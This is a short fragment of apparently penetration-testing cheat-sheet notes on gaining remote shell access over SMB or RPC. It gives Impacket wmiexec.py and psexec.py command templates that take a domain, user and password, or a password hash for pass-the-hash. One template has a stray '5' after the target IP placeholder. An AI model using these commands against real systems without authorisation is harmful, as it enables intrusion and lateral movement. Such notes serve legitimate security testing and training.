...
*********************************************************************************
Bracket characters themselves [ ] require removal.
*********************************************************************************
...
### Gaining shell access on SMB or RPC
Alternatives: wmiexec.py (works the most of times), smbexec.py. Syntax is the same as psexec.py
```
wmiexec.py [DOMAIN]/[USER-NAME]:'[PASSWORD]'@[TARGET-IP]
```

```bash
psexec.py [DOMAIN]/[USER-NAME]:'[PASSWORD]'@[TARGET-IP]
```

```bash
psexec.py [USER-NAME]@[TARGET-IP]5 -hashes [PASSWORD-HASH]
```
